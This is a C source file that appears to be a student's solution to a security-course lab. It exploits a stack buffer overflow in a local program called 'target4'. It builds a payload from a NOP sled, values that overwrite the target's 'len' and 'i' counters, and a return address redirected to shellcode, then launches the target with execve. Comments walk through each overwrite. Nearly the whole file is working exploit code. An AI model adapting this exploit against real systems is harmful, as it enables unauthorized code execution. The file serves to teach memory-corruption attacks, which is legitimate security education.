#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"

int main(void)
{
	char *args[3];
	char *env[1];
	char filler[143];
	int i;

	//pad with NOPs until we reach len
	for (i = 0; i < 123; i++) {
		filler[i] = '\x90';
	}

	//overwrite len with some ridiculously large number
	filler[123] = '\xAD';
	filler[124] = '\x01';
	filler[125] = '\x01';
	filler[126] = '\x01';

	//overwite i with some equally large rumber but 15 less 
	//(i will keep incrementing while copying "itself" and will end up being 12 less than len)
	//this allows us to avoid jumping i or having to wrry about any incrementation because I is not being
	//used as a reference in the copy but rather just a restrictor to avoid over copying
	//By overwriting len and i we allow ourselves enough space to overwrite foo's return address with buf's
	filler[127] = '\x9e';
	filler[128] = '\x01';
	filler[129] = '\x01';
	filler[130] = '\x01';


	// padding to get us to the retunr address of foo
	for (i = 131; i < 139; i++ ){
		filler[i] = '\x90';
	}

	//overwriting the return address of foo with the address of buf which contains shellcode
	filler[139] = '\xb0';
	filler[140] = '\xfd';
	filler[141] = '\x42';
	filler[142] = '\x40';


	args[0] = TARGET; 
	args[1] = strcat(shellcode, filler); 
	args[2] = NULL;

	env[0] = NULL;

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
